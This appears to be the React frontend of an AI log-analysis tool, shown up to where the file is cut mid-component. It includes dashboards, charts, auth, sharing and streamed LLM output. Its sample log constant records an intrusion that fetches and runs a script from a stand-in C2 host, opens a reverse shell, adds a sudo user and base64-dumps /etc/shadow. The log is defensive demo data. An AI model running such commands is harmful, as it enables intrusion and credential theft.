/**
 * AI Threat Analyzer — Enhanced Frontend
 * Features: Live streaming · Charts · PDF export · Shareable links
 *           Tags · Search & filter · Trends dashboard · Mobile responsive
 */

import { useState, useEffect, useRef, useCallback } from 'react';
import {
  LineChart, Line, BarChart, Bar, PieChart, Pie, Cell,
  XAxis, YAxis, CartesianGrid, Tooltip, ResponsiveContainer, Legend,
} from 'recharts';
import { supabase, getToken } from './lib/supabase.js';

const API = import.meta.env.VITE_API_URL || '';

// ── Severity config ───────────────────────────────────────────
const SEV = {
  CRITICAL:{ bg:'bg-red-500/10', border:'border-red-500/30', text:'text-red-400', dot:'bg-red-500', hex:'#ef4444' },
  HIGH:    { bg:'bg-orange-500/10', border:'border-orange-500/30', text:'text-orange-400', dot:'bg-orange-500', hex:'#f97316' },
  MEDIUM:  { bg:'bg-amber-500/10', border:'border-amber-500/30', text:'text-amber-400', dot:'bg-amber-500', hex:'#f59e0b' },
  LOW:     { bg:'bg-emerald-500/10', border:'border-emerald-500/30', text:'text-emerald-400', dot:'bg-emerald-500', hex:'#10b981' },
};
const getSev = (l) => SEV[(l||'').toUpperCase()] || { bg:'bg-slate-800', border:'border-slate-700', text:'text-slate-400', dot:'bg-slate-500', hex:'#64748b' };

const MITRE_TACTICS = [
  'Reconnaissance','Resource Dev','Initial Access','Execution',
  'Persistence','Priv Escalation','Defense Evasion','Cred Access',
  'Discovery','Lateral Movement','Collection','C2','Exfiltration','Impact',
];

const PRESET_TAGS = ['APT','Ransomware','Phishing','Malware','Insider','Exfiltration','Lateral Movement','Zero Day','Scripted','Brute Force'];

const SAMPLE = `2024-01-15 02:14:33 FIREWALL DENY  src=185.220.101.47  dst=10.0.1.5   port=22   proto=TCP  count=847
2024-01-15 02:14:33 FIREWALL DENY  src=185.220.101.47  dst=10.0.1.5   port=3389 proto=TCP  count=312
2024-01-15 02:18:47 SSH FAIL   src=185.220.101.47  user=admin  dst=10.0.1.5
2024-01-15 02:18:49 SSH FAIL   src=185.220.101.47  user=root   dst=10.0.1.5
2024-01-15 02:19:22 SSH SUCCESS src=185.220.101.47 user=deploy dst=10.0.1.5 session=44291
2024-01-15 02:19:28 PROCESS pid=9934 user=deploy cmd="wget http://malware-c2.ru/stage2.sh -O /tmp/.hidden_update"
2024-01-15 02:19:28 DNS QUERY src=10.0.1.5 query=malware-c2.ru type=A response=91.108.4.14
2024-01-15 02:19:32 PROCESS pid=9945 user=deploy cmd="chmod +x /tmp/.hidden_update && /tmp/.hidden_update"
2024-01-15 02:19:33 SYSLOG WARN msg="Privilege escalation via CVE-2023-0386 process gained root"
2024-01-15 02:19:35 NETWORK dst=91.108.4.14 src=10.0.1.5 port=4444 state=ESTABLISHED msg="Reverse shell"
2024-01-15 02:19:36 FILE MODIFY path=/etc/crontab change="Added persistence entry"
2024-01-15 02:19:38 PROCESS user=root cmd="useradd -m -s /bin/bash -G sudo svc_backup"
2024-01-15 02:19:40 PROCESS user=root cmd="cat /etc/shadow | base64"
2024-01-15 02:20:03 SSH SUCCESS src=10.0.1.5 user=ubuntu dst=10.0.1.12 msg="Lateral movement"
2024-01-15 02:21:19 NETWORK dst=91.108.4.14 src=10.0.1.12 port=443 bytes=94732180 msg="90.3MB exfiltrated"`;

// ── API helpers ───────────────────────────────────────────────
async function apiFetch(path, opts = {}) {
  const token = await getToken();
  const res = await fetch(`${API}${path}`, {
    headers: {
      'Content-Type': 'application/json',
      ...(token ? { Authorization: `Bearer ${token}` } : {}),
      ...(opts.headers || {}),
    },
    ...opts,
  });
  const data = await res.json();
  if (!res.ok) throw new Error(data.error || `HTTP ${res.status}`);
  return data;
}

// ── Check URL for shared report ───────────────────────────────
function getSharedIdFromUrl() {
  const params = new URLSearchParams(window.location.search);
  return params.get('r') || null;
}

// ══════════════════════════════════════════════════════════════
// SHARED UI COMPONENTS
// ══════════════════════════════════════════════════════════════

function Badge({ level, className = '' }) {
  const s = getSev(level);
  return (
    <span className={`inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-md text-xs font-semibold border ${s.bg} ${s.border} ${s.text} ${className}`}>
      <span className={`w-1.5 h-1.5 rounded-full ${s.dot}`} />
      {(level || 'UNKNOWN').toUpperCase()}
    </span>
  );
}

function Card({ children, className = '' }) {
  return (
    <div className={`bg-[#0f1117] border border-white/[0.06] rounded-2xl ${className}`}>
      {children}
    </div>
  );
}

function ScoreRing({ score }) {
  const r = 48, c = 2 * Math.PI * r;
  const fill = ((score || 0) / 100) * c;
  const color = score >= 80 ? '#ef4444' : score >= 60 ? '#f97316' : score >= 40 ? '#f59e0b' : '#10b981';
  const label = score >= 80 ? 'CRITICAL' : score >= 60 ? 'HIGH' : score >= 40 ? 'MEDIUM' : 'LOW';
  return (
    <div className="flex flex-col items-center gap-2">
      <div className="relative">
        <svg width="120" height="120" viewBox="0 0 120 120">
          <circle cx="60" cy="60" r={r} fill="none" stroke="rgba(255,255,255,0.05)" strokeWidth="8" />
          <circle cx="60" cy="60" r={r} fill="none" stroke={color} strokeWidth="8"
            strokeLinecap="round" strokeDasharray={`${fill} ${c}`}
            transform="rotate(-90 60 60)"
            style={{ transition:'stroke-dasharray 1.2s ease', filter:`drop-shadow(0 0 6px ${color}88)` }} />
        </svg>
        <div className="absolute inset-0 flex flex-col items-center justify-center">
          <span className="text-2xl font-black" style={{ color }}>{score}</span>
          <span className="text-xs text-slate-500">/ 100</span>
        </div>
      </div>
      <span className={`text-[10px] font-bold tracking-widest uppercase ${getSev(label).text}`}>{label}</span>
    </div>
  );
}

function MitreMatrix({ mappings = [] }) {
  const byTactic = {};
  mappings.forEach(m => { if (!byTactic[m.tactic]) byTactic[m.tactic] = []; byTactic[m.tactic].push(m); });
  return (
    <div className="flex gap-1.5 min-w-max">
      {MITRE_TACTICS.map(tactic => {
        const hits = byTactic[tactic] || [];
        const active = hits.length > 0;
        return (
          <div key={tactic} className="w-[68px] flex-shrink-0">
            <div className={`text-center px-1 py-2 rounded-t-lg leading-tight ${active ? 'bg-blue-600/20 text-blue-300 border border-blue-600/30 border-b-0' : 'bg-white/[0.03] text-slate-600 border border-white/[0.06] border-b-0'}`}
              style={{ fontSize:'9px', fontWeight:600 }}>{tactic}</div>
            <div className={`min-h-8 p-1 space-y-1 rounded-b-lg border border-t-0 ${active ? 'bg-blue-600/10 border-blue-600/30' : 'bg-white/[0.02] border-white/[0.06]'}`}>
              {hits.map((h,i) => (
                <div key={i} title={`${h.name} — ${h.confidence}%`}
                  className="text-center py-0.5 rounded cursor-help bg-blue-500/20 text-blue-300 border border-blue-500/20"
                  style={{ fontSize:'9px', fontFamily:'monospace', fontWeight:600 }}>
                  {h.technique}
                </div>
              ))}
            </div>
          </div>
        );
      })}
    </div>
  );
}

function Toast({ message, type, onClose }) {
  useEffect(() => { const t = setTimeout(onClose, 4000); return () => clearTimeout(t); }, []);
  const s = { success:'bg-emerald-500/10 border-emerald-500/30 text-emerald-300', error:'bg-red-500/10 border-red-500/30 text-red-300', info:'bg-blue-500/10 border-blue-500/30 text-blue-300' };
  return (
    <div className={`fixed top-4 right-4 z-50 flex items-center gap-3 px-4 py-3 rounded-xl border text-sm max-w-sm shadow-2xl animate-fadeIn ${s[type]||s.info}`}>
      <span>{type==='success'?'✓':type==='error'?'✗':'ℹ'}</span>
      <span className="flex-1">{message}</span>
      <button onClick={onClose} className="opacity-40 hover:opacity-100 ml-1 text-lg leading-none">×</button>
    </div>
  );
}

// ── Tag editor ────────────────────────────────────────────────
function TagEditor({ scanId, initialTags = [], onUpdate }) {
  const [tags, setTags] = useState(initialTags);
  const [saving, setSaving] = useState(false);

  async function toggle(tag) {
    const next = tags.includes(tag) ? tags.filter(t => t !== tag) : [...tags, tag];
    setTags(next);
    setSaving(true);
    try {
      await apiFetch(`/api/scans/${scanId}/tags`, { method:'PATCH', body:JSON.stringify({ tags:next }) });
      onUpdate?.(next);
    } catch (_) {}
    setSaving(false);
  }

  return (
    <div>
      <div className="flex items-center gap-2 mb-2">
        <span className="text-xs text-slate-500 uppercase tracking-wider">Tags</span>
        {saving && <span className="text-xs text-slate-600 animate-pulse">saving…</span>}
      </div>
      <div className="flex flex-wrap gap-1.5">
        {PRESET_TAGS.map(tag => (
          <button key={tag} onClick={() => toggle(tag)}
            className={`px-2.5 py-1 rounded-lg text-xs font-medium border transition-all ${tags.includes(tag) ? 'bg-blue-600/20 border-blue-500/40 text-blue-300' : 'bg-white/[0.03] border-white/[0.06] text-slate-500 hover:text-slate-300 hover:border-white/20'}`}>
            {tag}
          </button>
        ))}
      </div>
    </div>
  );
}

// ── Share button ──────────────────────────────────────────────
function ShareButton({ scanId, isPublic: initialPublic, onToast }) {
  const [isPublic, setIsPublic] = useState(initialPublic || false);
  const [loading, setLoading] = useState(false);

  async function toggle() {
    setLoading(true);
    try {
      const data = await apiFetch(`/api/scans/${scanId}/share`, { method:'PATCH' });
      setIsPublic(data.is_public);
      if (data.is_public) {
        const url = `${window.location.origin}?r=${scanId}`;
        await navigator.clipboard.writeText(url);
        onToast('Link copied to clipboard!', 'success');
      } else {
        onToast('Report is now private.', 'info');
      }
    } catch (err) { onToast(err.message, 'error'); }
    setLoading(false);
  }

  async function copyLink() {
    const url = `${window.location.origin}?r=${scanId}`;
    await navigator.clipboard.writeText(url);
    onToast('Link copied!', 'success');
  }

  return (
    <div className="flex items-center gap-2">
      <button onClick={toggle} disabled={loading}
        className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-medium border transition-all ${isPublic ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-400' : 'bg-white/[0.03] border-white/[0.06] text-slate-400 hover:text-white'}`}>
        {loading ? '…' : isPublic ? '🔗 Public' : '🔒 Private'}
      </button>
      {isPublic && (
        <button onClick={copyLink} className="flex items-center gap-1 px-2.5 py-1.5 rounded-lg text-xs bg-white/[0.03] border border-white/[0.06] text-slate-400 hover:text-white transition-colors">
          Copy Link
        </button>
      )}
    </div>
  );
}

// ── PDF export ────────────────────────────────────────────────
function PDFButton() {
  function handlePrint() {
    window.print();
  }
  return (
    <button onClick={handlePrint}
      className="no-print flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-medium bg-white/[0.03] border border-white/[0.06] text-slate-400 hover:text-white hover:bg-white/[0.06] transition-all">
      📄 Export PDF
    </button>
  );
}

// ══════════════════════════════════════════════════════════════
// CHARTS
// ══════════════════════════════════════════════════════════════

const CHART_COLORS = ['#ef4444','#f97316','#f59e0b','#10b981'];

function SeverityPieChart({ scans }) {
  const data = ['CRITICAL','HIGH','MEDIUM','LOW'].map((sev, i) => ({
    name: sev,
    value: scans.filter(s => s.severity === sev).length,
    color: CHART_COLORS[i],
  })).filter(d => d.value > 0);

  if (data.length === 0) return <div className="flex items-center justify-center h-40 text-slate-600 text-sm">No data yet</div>;

  return (
    <ResponsiveContainer width="100%" height={180}>
      <PieChart>
        <Pie data={data} cx="50%" cy="50%" innerRadius={45} outerRadius={70} paddingAngle={3} dataKey="value">
          {data.map((entry, i) => <Cell key={i} fill={entry.color} opacity={0.85} />)}
        </Pie>
        <Tooltip
          contentStyle={{ background:'#0f1117', border:'1px solid rgba(255,255,255,0.1)', borderRadius:'8px', fontSize:'12px' }}
          labelStyle={{ color:'#94a3b8' }} itemStyle={{ color:'#e2e8f0' }} />
        <Legend iconType="circle" iconSize={8} formatter={(v) => <span style={{ color:'#94a3b8', fontSize:'11px' }}>{v}</span>} />
      </PieChart>
    </ResponsiveContainer>
  );
}

function RiskLineChart({ scans }) {
  const data = [...scans].reverse().slice(-15).map((s, i) => ({
    name: `#${i+1}`,
    score: s.risk_score || 0,
    date: new Date(s.created_at).toLocaleDateString('en-IN', { day:'numeric', month:'short' }),
  }));

  if (data.length < 2) return <div className="flex items-center justify-center h-40 text-slate-600 text-sm">Need 2+ scans</div>;

  return (
    <ResponsiveContainer width="100%" height={180}>
      <LineChart data={data} margin={{ top:5, right:10, left:-20, bottom:5 }}>
        <CartesianGrid strokeDasharray="3 3" stroke="rgba(255,255,255,0.05)" />
        <XAxis dataKey="name" tick={{ fill:'#64748b', fontSize:10 }} axisLine={false} tickLine={false} />
        <YAxis domain={[0,100]} tick={{ fill:'#64748b', fontSize:10 }} axisLine={false} tickLine={false} />
        <Tooltip
          contentStyle={{ background:'#0f1117', border:'1px solid rgba(255,255,255,0.1)', borderRadius:'8px', fontSize:'12px' }}
          labelStyle={{ color:'#94a3b8' }}
          formatter={(v) => [v, 'Risk Score']}
          labelFormatter={(_, payload) => payload?.[0]?.payload?.date || ''} />
        <Line type="monotone" dataKey="score" stroke="#3b82f6" strokeWidth={2} dot={{ fill:'#3b82f6', r:3 }} activeDot={{ r:5 }} />
      </LineChart>
    </ResponsiveContainer>
  );
}

function DailyScanChart({ scans }) {
  const last7 = Array.from({ length: 7 }, (_, i) => {
    const d = new Date();
    d.setDate(d.getDate() - (6 - i));
    const key = d.toISOString().split('T')[0];
    const label = d.toLocaleDateString('en-IN', { weekday:'short' });
    return {
      day: label,
      count: scans.filter(s => s.created_at?.startsWith(key)).length,
    };
  });

  return (
    <ResponsiveContainer width="100%" height={180}>
      <BarChart data={last7} margin={{ top:5, right:10, left:-20, bottom:5 }}>
        <CartesianGrid strokeDasharray="3 3" stroke="rgba(255,255,255,0.05)" />
        <XAxis dataKey="day" tick={{ fill:'#64748b', fontSize:10 }} axisLine={false} tickLine={false} />
        <YAxis allowDecimals={false} tick={{ fill:'#64748b', fontSize:10 }} axisLine={false} tickLine={false} />
        <Tooltip
          contentStyle={{ background:'#0f1117', border:'1px solid rgba(255,255,255,0.1)', borderRadius:'8px', fontSize:'12px' }}
          labelStyle={{ color:'#94a3b8' }}
          formatter={(v) => [v, 'Scans']} />
        <Bar dataKey="count" fill="#3b82f6" opacity={0.8} radius={[4,4,0,0]} />
      </BarChart>
    </ResponsiveContainer>
  );
}

// ══════════════════════════════════════════════════════════════
// STREAMING ANALYSIS
// ══════════════════════════════════════════════════════════════

function StreamingAnalysis({ input, file, onComplete, onError }) {
  const [chunks, setChunks] = useState('');
  const [status, setStatus] = useState('connecting');
  const bottomRef = useRef();

  useEffect(() => {
    (async () => {
      setStatus('streaming');
      try {
        const token = await getToken();
        const headers = { 'Content-Type': 'application/json' };
        if (token) headers['Authorization'] = `Bearer ${token}`;

        const res = await fetch(`${API}/api/analyze/stream`, {
          method: 'POST',
          headers,
          body: JSON.stringify({ input: input || '' }),
        });

        if (!res.ok) {
          const err = await res.json();
          throw new Error(err.error || 'Stream failed');
        }

        const reader = res.body.getReader();
        const decoder = new TextDecoder();
        let buffer = '';

        while (true) {
          const { done, value } = await reader.read();
          if (done) break;
          buffer += decoder.decode(value, { stream: true });
          const lines = buffer.split('\n');
          buffer = lines.pop();
          for (const line of lines) {
            if (!line.startsWith('data: ')) continue;
            try {
              const data = JSON.parse(line.slice(6));
              if (data.type === 'chunk') {
                setChunks(t => t + data.text);
                setTimeout(() => bottomRef.current?.scrollIntoView({ behavior:'smooth' }), 50);
              }
              if (data.type === 'done') {
                setStatus('done');
                setTimeout(() => onComplete(data.result, data.scanId), 600);
              }
              if (data.type === 'error') throw new Error(data.message);
            } catch (_) {}
          }
        }
      } catch (err) {
        onError(err.message || 'Streaming failed. Please try again.');
      }
    })();
  }, []);

  const progress = Math.min(98, Math.round((chunks.length / 1800) * 100));

  return (
    <div className="space-y-4">
      {/* Status bar */}
      <div className="flex items-center justify-between mb-1">
        <div className="flex items-center gap-2">
          <div className={`w-2 h-2 rounded-full ${status === 'done' ? 'bg-emerald-500' : 'bg-blue-500 animate-pulse'}`} />
          <span className="text-xs text-slate-400">
            {status === 'connecting' ? 'Connecting to AI…' : status === 'done' ? 'Analysis complete ✓' : 'AI is analysing your logs…'}
          </span>
        </div>
        <span className="text-xs text-slate-600 font-mono">{chunks.length} chars</span>
      </div>
      <div className="h-0.5 bg-white/5 rounded-full overflow-hidden">
        <div className="h-full bg-gradient-to-r from-blue-600 to-blue-400 rounded-full transition-all duration-300"
          style={{ width: status === 'done' ? '100%' : `${progress}%` }} />
      </div>

      {/* Live text terminal */}
      <div className="bg-[#060810] border border-white/[0.06] rounded-xl overflow-hidden">
        <div className="flex items-center gap-2 px-4 py-2.5 border-b border-white/[0.04] bg-white/[0.02]">
          <div className="w-2.5 h-2.5 rounded-full bg-red-500/60" />
          <div className="w-2.5 h-2.5 rounded-full bg-yellow-500/60" />
          <div className="w-2.5 h-2.5 rounded-full bg-emerald-500/60" />
          <span className="text-slate-600 text-xs ml-2 font-mono">llama-3.3-70b — live output</span>
        </div>
        <div className="p-4 font-mono text-xs leading-relaxed overflow-y-auto max-h-72 min-h-32">
          {chunks ? (
            <>
              <span className="text-emerald-400/80">{chunks}</span>
              {status !== 'done' && <span className="text-blue-400 animate-pulse">▋</span>}
            </>
          ) : (
            <span className="text-slate-700">Waiting for AI response<span className="animate-pulse">…</span></span>
          )}
          <div ref={bottomRef} />
        </div>
      </div>
    </div>
  );
}

// ══════════════════════════════════════════════════════════════
// LANDING
// ══════════════════════════════════════════════════════════════
function Landing({ onLogin, onSignup }) {
  return (
    <div className="min-h-screen bg-[#080a0e] text-white">
      <header className="border-b border-white/[0.06] h-14 flex items-center px-6">
        <div className="max-w-5xl mx-auto w-full flex items-center justify-between">
          <div className="flex items-center gap-2">
            <div className="w-7 h-7 rounded-lg bg-blue-600 flex items-center justify-center">🛡</div>
            <span className="font-bold">ThreatAnalyzer</span>
            <span className="text-[10px] font-mono text-blue-400 bg-blue-500/10 border border-blue-500/20 px-1.5 py-0.5 rounded ml-1">AI</span>
          </div>
          <div className="flex items-center gap-2">
            <button onClick={onLogin} className="px-4 py-1.5 text-slate-400 hover:text-white text-sm transition-colors">Sign In</button>
            <button onClick={onSignup} className="px-4 py-1.5 bg-blue-600 hover:bg-blue-500 text-white text-sm font-medium rounded-lg transition-colors">Get Started</button>
          </div>
        </div>
      </header>

      <div className="max-w-5xl mx-auto px-6">
        <div className="pt-20 pb-16 text-center">
          <div className="inline-flex items-center gap-2 bg-blue-500/10 border border-blue-500/20 rounded-full px-4 py-1.5 text-blue-400 text-xs font-medium mb-8">
            <span className="w-1.5 h-1.5 rounded-full bg-blue-400 animate-pulse" />
            MITRE ATT&CK v14 · Live AI Streaming · Free & Unlimited
          </div>
          <h1 className="text-5xl md:text-6xl font-black leading-tight mb-6">
            Instant Threat<br />
            <span className="text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-blue-600">Intelligence</span>
          </h1>
          <p className="text-slate-400 text-lg max-w-xl mx-auto mb-10 leading-relaxed">
            Paste any security log and watch the AI analyse it live. Get ATT&CK mapping, IOCs, risk scoring, charts, and PDF reports — in seconds.
          </p>
          <div className="flex items-center justify-center gap-3 flex-wrap">
            <button onClick={onSignup} className="px-7 py-3 bg-blue-600 hover:bg-blue-500 text-white font-semibold rounded-xl transition-all hover:scale-105 shadow-lg shadow-blue-600/20">
              Start Analysing Free →
            </button>
            <button onClick={onLogin} className="px-7 py-3 bg-white/5 hover:bg-white/10 border border-white/10 text-white font-medium rounded-xl transition-colors">
              Sign In
            </button>
          </div>
        </div>

        <div className="grid grid-cols-2 md:grid-cols-4 gap-3 pb-8">
          {[['🔴','Live Streaming','Watch AI analyse in real-time'],['📊','Charts & Trends','Visualise your threat history'],['📄','PDF Export','Download professional reports'],['🔗','Share Links','Share reports with your team']].map(([icon,title,desc]) => (
            <div key={title} className="bg-[#0f1117] border border-white/[0.06] rounded-2xl p-5 hover:border-white/10 transition-colors">
              <div className="text-xl mb-2">{icon}</div>
              <div className="font-semibold text-sm mb-1">{title}</div>
              <div className="text-slate-500 text-xs leading-relaxed">{desc}</div>
            </div>
          ))}
        </div>

        <div className="grid grid-cols-2 md:grid-cols-4 gap-3 pb-20">
          {[['🗺️','MITRE ATT&CK','200+ techniques mapped'],['🎯','IOC Extraction','IPs, domains, hashes'],['🏷️','Tag & Label','Organise your scans'],['🔍','Search & Filter','Find past incidents']].map(([icon,title,desc]) => (
            <div key={title} className="bg-[#0f1117] border border-white/[0.06] rounded-2xl p-5 hover:border-white/10 transition-colors">
              <div className="text-xl mb-2">{icon}</div>
              <div className="font-semibold text-sm mb-1">{title}</div>
              <div className="text-slate-500 text-xs leading-relaxed">{desc}</div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

// ══════════════════════════════════════════════════════════════
// AUTH
// ══════════════════════════════════════════════════════════════
function Auth({ mode, onSuccess, onSwitch }) {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [msg, setMsg] = useState('');
  const [isErr, setIsErr] = useState(false);

  async function submit(e) {
    e.preventDefault(); setLoading(true); setMsg('');
    try {
      const res = mode === 'login'
        ? await supabase.auth.signInWithPassword({ email, password })
        : await supabase.auth.signUp({ email, password });
      if (res.error) throw res.error;
      if (mode === 'signup' && !res.data.session) { setIsErr(false); setMsg('Check your email to confirm, then sign in.'); return; }
      onSuccess(res.data.user);
    } catch (err) { setIsErr(true); setMsg(err.message); }
    finally { setLoading(false); }
  }

  return (
    <div className="min-h-screen bg-[#080a0e] flex items-center justify-center p-4">
      <div className="w-full max-w-sm">
        <div className="text-center mb-8">
          <div className="w-12 h-12 rounded-2xl bg-blue-600 flex items-center justify-center text-2xl mx-auto mb-4">🛡</div>
          <h2 className="text-xl font-bold text-white">{mode==='login'?'Welcome back':'Create account'}</h2>
        </div>
        <Card className="p-6">
          <form onSubmit={submit} className="space-y-4">
            {[['Email','email',email,setEmail,'you@example.com'],['Password','password',password,setPassword,'••••••••']].map(([l,t,v,s,p]) => (
              <div key={l}>
                <label className="block text-xs font-medium text-slate-400 mb-1.5">{l}</label>
                <input type={t} value={v} onChange={e=>s(e.target.value)} required minLength={t==='password'?6:undefined}
                  className="w-full bg-white/5 border border-white/10 rounded-lg px-3 py-2.5 text-white text-sm placeholder-slate-600 focus:border-blue-500/50 focus:outline-none focus:ring-1 focus:ring-blue-500/20 transition-colors"
                  placeholder={p} />
              </div>
            ))}
            {msg && <div className={`text-xs px-3 py-2.5 rounded-lg border ${isErr?'bg-red-500/10 border-red-500/20 text-red-400':'bg-emerald-500/10 border-emerald-500/20 text-emerald-400'}`}>{msg}</div>}
            <button type="submit" disabled={loading}
              className="w-full py-2.5 bg-blue-600 hover:bg-blue-500 disabled:bg-white/5 disabled:text-slate-600 text-white font-semibold text-sm rounded-lg transition-colors">
              {loading ? 'Please wait…' : mode==='login' ? 'Sign In' : 'Create Account'}
            </button>
          </form>
        </Card>
        <p className="text-center text-xs text-slate-600 mt-4">
          {mode==='login' ? "Don't have an account? " : 'Already have an account? '}
          <button onClick={onSwitch} className="text-blue-400 hover:text-blue-300 font-medium">{mode==='login'?'Sign up free':'Sign in'}</button>
        </p>
      </div>
    </div>
  );
}

// ══════════════════════════════════════════════════════════════
// DASHBOARD
// ══════════════════════════════════════════════════════════════
function Dashboard({ user, onNewScan, onViewScan }) {
  const [scans, setScans] = useState([]);
  const [loading, setLoading] = useState(true);
  const [search, setSearch] = useState('');
  const [filterSev, setFilterSev] = useState('ALL');
  const [activeTab, setActiveTab] = useState('scans');

  useEffect(() => {
    apiFetch('/api/scans').then(d => { setScans(d.scans||[]); setLoading(false); }).catch(()=>setLoading(false));
  }, []);

  const filtered = scans.filter(s => {
    const matchSearch = !search || (s.title||'').toLowerCase().includes(search.toLowerCase()) || s.severity?.toLowerCase().includes(search.toLowerCase()) || (s.tags||[]).some(t => t.toLowerCase().includes(search.toLowerCase()));
    const matchSev = filterSev === 'ALL' || s.severity === filterSev;
    return matchSearch && matchSev;
  });

  return (
    <div className="min-h-screen bg-[#080a0e]">
      <div className="max-w-5xl mx-auto px-4 md:px-6 py-6 md:py-8">

        {/* Header */}
        <div className="flex items-center justify-between mb-6 md:mb-8">
          <div>
            <h1 className="text-lg md:text-xl font-bold text-white">Dashboard</h1>
            <p className="text-slate-500 text-xs md:text-sm mt-0.5 truncate max-w-xs">{user?.email}</p>
          </div>
          <button onClick={onNewScan} className="flex items-center gap-1.5 px-3 md:px-4 py-2 bg-blue-600 hover:bg-blue-500 text-white text-xs md:text-sm font-medium rounded-xl transition-colors shadow-lg shadow-blue-600/20">
            + New Analysis
          </button>
        </div>

        {/* Stats */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-3 mb-5">
          {[['Total',scans.length,'📋'],['Critical',scans.filter(s=>s.severity==='CRITICAL').length,'🔴'],['High',scans.filter(s=>s.severity==='HIGH').length,'🟠'],['Avg Score',scans.length?Math.round(scans.reduce((a,s)=>a+(s.risk_score||0),0)/scans.length):0,'📊']].map(([l,v,icon]) => (
            <Card key={l} className="p-4">
              <div className="flex items-center justify-between mb-1">
                <span className="text-slate-500 text-xs uppercase tracking-wider">{l}</span>
                <span className="text-base">{icon}</span>
              </div>
              <div className="text-2xl font-black text-white">{v}</div>
            </Card>
          ))}
        </div>

        {/* Tabs */}
        <div className="flex gap-1 mb-5 bg-white/[0.03] border border-white/[0.06] rounded-xl p-1 w-fit">
          {[['scans','📋 Scans'],['trends','📊 Trends']].map(([id,label]) => (
            <button key={id} onClick={()=>setActiveTab(id)}
              className={`px-4 py-1.5 rounded-lg text-xs font-medium transition-all ${activeTab===id?'bg-white/10 text-white':'text-slate-500 hover:text-slate-300'}`}>
              {label}
            </button>
          ))}
        </div>

        {/* Scans tab */}
        {activeTab === 'scans' && (
          <Card>
            {/* Search & filter */}
            <div className="px-4 md:px-6 py-4 border-b border-white/[0.06] flex flex-col sm:flex-row gap-3">
              <div className="flex-1 relative">
                <span className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-600 text-sm">🔍</span>
                <input value={search} onChange={e=>setSearch(e.target.value)}
                  className="w-full bg-white/5 border border-white/10 rounded-lg pl-8 pr-3 py-2 text-white text-xs placeholder-slate-600 focus:border-blue-500/50 focus:outline-none"
                  placeholder="Search by title, tag, severity…" />
              </div>
              <select value={filterSev} onChange={e=>setFilterSev(e.target.value)}
                className="bg-white/5 border border-white/10 rounded-lg px-3 py-2 text-xs text-slate-300 focus:outline-none focus:border-blue-500/50">
                {['ALL','CRITICAL','HIGH','MEDIUM','LOW'].map(s => <option key={s} value={s} className="bg-[#0f1117]">{s === 'ALL' ? 'All Severities' : s}</option>)}
              </select>
              <button onClick={onNewScan} className="text-blue-400 hover:text-blue-300 text-xs font-medium whitespace-nowrap transition-colors">+ New</button>
            </div>

            {loading ? (
              <div className="py-16 text-center text-slate-600 text-sm">Loading…</div>
            ) : filtered.length === 0 ? (
              <div className="py-16 text-center">
                <div className="text-3xl mb-3">🔍</div>
                <p className="text-slate-400 font-medium text-sm mb-1">{scans.length === 0 ? 'No analyses yet' : 'No results found'}</p>
                <p className="text-slate-600 text-xs mb-5">{scans.length === 0 ? 'Paste a log file to get your first threat report' : 'Try adjusting your search or filter'}</p>
                {scans.length === 0 && <button onClick={onNewScan} className="px-5 py-2 bg-blue-600 hover:bg-blue-500 text-white text-sm font-medium rounded-lg transition-colors">Run First Analysis</button>}
              </div>
            ) : (
              <div className="divide-y divide-white/[0.04]">
                {filtered.map(scan => (
                  <div key={scan.id} className="px-4 md:px-6 py-4 flex items-center gap-3 md:gap-4 hover:bg-white/[0.02] transition-colors group">
                    <div className={`w-2 h-2 rounded-full flex-shrink-0 ${getSev(scan.severity).dot}`} />
                    <div className="flex-1 min-w-0">
                      <div className="flex flex-wrap items-center gap-2 mb-1">
                        <Badge level={scan.severity} />
                        <span className="text-white text-sm font-semibold truncate">{scan.title || `Risk ${scan.risk_score}/100`}</span>
                      </div>
                      <div className="flex flex-wrap items-center gap-2">
                        <span className="text-slate-500 text-xs">{new Date(scan.created_at).toLocaleString('en-IN',{dateStyle:'medium',timeStyle:'short'})}</span>
                        {(scan.tags||[]).slice(0,3).map(tag => (
                          <span key={tag} className="text-[10px] bg-blue-500/10 border border-blue-500/20 text-blue-400 px-1.5 py-0.5 rounded">{tag}</span>
                        ))}
                        {scan.is_public && <span className="text-[10px] bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 px-1.5 py-0.5 rounded">🔗 Public</span>}
                      </div>
                    </div>
                    <button onClick={()=>onViewScan(scan.id)} className="text-xs text-slate-600 group-hover:text-blue-400 font-medium transition-colors flex-shrink-0">
                      View →
                    </button>
                  </div>
                ))}
              </div>
            )}
          </Card>
        )}

        {/* Trends tab */}
        {activeTab === 'trends' && (
          <div className="space-y-4">
            {scans.length < 2 ? (
              <Card className="p-10 text-center">
                <div className="text-4xl mb-3">📊</div>
                <p className="text-slate-400 font-medium text-sm mb-1">Not enough data yet</p>
                <p className="text-slate-600 text-xs">Run at least 2 analyses to see trend charts</p>
              </Card>
            ) : (
              <>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <Card className="p-5">
                    <h3 className="font-semibold text-sm text-white mb-4">Severity Breakdown</h3>
                    <SeverityPieChart scans={scans} />
                  </Card>
                  <Card className="p-5">
                    <h3 className="font-semibold text-sm text-white mb-4">Risk Score Trend</h3>
                    <RiskLineChart scans={scans} />
                  </Card>
                </div>
                <Card className="p-5">
                  <h3 className="font-semibold text-sm text-white mb-4">Scans Per Day (Last 7 Days)</h3>
                  <DailyScanChart scans={scans} />
                </Card>
                <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
                  {['CRITICAL','HIGH','MEDIUM','LOW'].map(sev => {
                    const sevScans = scans.filter(s => s.severity === sev);
                    const s = getSev(sev);
                    return (
                      <Card key={sev} className={`p-4 border ${s.border}`}>
                        <div className={`text-xs font-medium uppercase tracking-wider mb-2 ${s.text}`}>{sev}</div>
                        <div className="text-2xl font-black text-white">{sevScans.length}</div>
                        <div className="text-xs text-slate-500 mt-1">
